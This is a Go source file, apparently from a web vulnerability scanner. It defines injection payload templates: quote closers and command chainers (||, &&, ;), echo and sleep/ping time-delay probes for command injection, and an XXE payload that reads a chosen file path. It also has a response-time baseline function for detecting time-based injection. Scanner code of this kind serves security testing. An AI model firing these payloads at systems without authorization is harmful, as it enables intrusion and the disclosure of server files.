package injectAttacks

import (
	"github.com/OctopusScan/webVulScanEngine/base"
	"math"
	"time"
)

var (
	CommandCloseType               = map[int]string{0: `'`, 1: `"`, 2: ``}
	CommandLinkType                = map[int]string{0: `||`, 1: `&&`, 2: `;`}
	CommandInjectWithWindowsEcho   = "set /a result={expression}"
	CommandInjectWithWindowsNoEcho = "ping -n {timeout} 127.0.0.1>nul"
	CommandInjectWithLinuxEcho     = "echo $(({expression}))"
	CommandInjectWithLinuxNoEcho   = "sleep {timeout}"
	XXEInjectReadFile              = `<?xml version="1.0" encoding="utf-8"?><!DOCTYPE creds [<!ENTITY result SYSTEM "{{PATH}}"> ]><creds>&result;</creds>`
)

type InjectTypeCtx struct {
	attackType InjectType
	config     interface{}
}

func (i InjectTypeCtx) GetConfig() interface{} {
	return i.config
}

func (i InjectTypeCtx) GetAttackType() interface{} {
	return i.attackType
}

type InjectType int

const (
	Dbs InjectType = iota
	Command
	XSS
	PathTraversal
	XXE
)

type InjectPoint struct {
	Pos       int
	CloseType string
}

type BaseInject struct {
	base.BaseTarget
}

func (b *BaseInject) GetNormalRespondTime() (error, float64) {
	var timeRec []float64
	for i := 0; i < 5; i++ {
		start := time.Now() // 记录开始时间
		_, err := b.SendRequest("", base.Param{}, base.DefaultRequestOptionsWithoutRetry)
		if err != nil {
			return err, -1
		}
		elapsed := time.Since(start) // 计算耗时
		ms := float64(elapsed.Nanoseconds()) / float64(time.Millisecond)
		timeRec = append(timeRec, ms)
	}
	return nil, mean(timeRec) + 7*std(timeRec)
}

func mean(v []float64) float64 {
	var res float64 = 0
	var n = len(v)
	for i := 0; i < n; i++ {
		res += v[i]
	}
	return res / float64(n)
}

func std(v []float64) float64 {
	return math.Sqrt(variance(v))
}

func variance(v []float64) float64 {
	var res float64 = 0
	var m = mean(v)
	var n = len(v)
	for i := 0; i < n; i++ {
		res += (v[i] - m) * (v[i] - m)
	}
	return res / float64(n-1)
}
